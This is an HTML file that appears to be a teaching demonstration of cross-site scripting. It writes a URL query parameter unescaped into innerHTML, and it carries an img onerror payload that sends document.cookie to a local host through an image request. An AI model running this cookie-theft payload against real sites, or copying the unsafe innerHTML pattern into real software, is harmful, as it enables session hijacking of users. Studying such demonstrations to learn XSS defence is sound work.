<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
  </head>
  <body>
    Hello from example 02
    <span id="username"></span>

    <img src="does-not-exist" alt="Sample Image" onerror=`var img =
    document.createElement("img"); img.src =
    `http://127.0.0.1:5500/randomUrl?data=${document.cookie}`;
    document.body.appendChild(img);` />
  </body>
  <script>
    // Here i will pass name=Shrey as query params

    // This cookie is to set from the backend but just for the example purpose i am setting it from the frontend
    function setRandomCookie() {
      const randomName = `cookie_${Math.random()
        .toString(36)
        .substring(2, 10)}`;
      const randomValue = Math.random().toString(36).substring(2, 10);

      const randomDays = Math.floor(Math.random() * 30) + 1;
      const expirationDate = new Date();
      expirationDate.setDate(expirationDate.getDate() + randomDays);

      document.cookie = `${randomName}=${randomValue}; expires=${expirationDate.toUTCString()}; path=/;`;
    }

    setRandomCookie();

    const params = new URLSearchParams(window.location.search);
    const name = params.get("name");
    document.getElementById("username").innerHTML = `<h1>${name}</h1>`;
  </script>
</html>
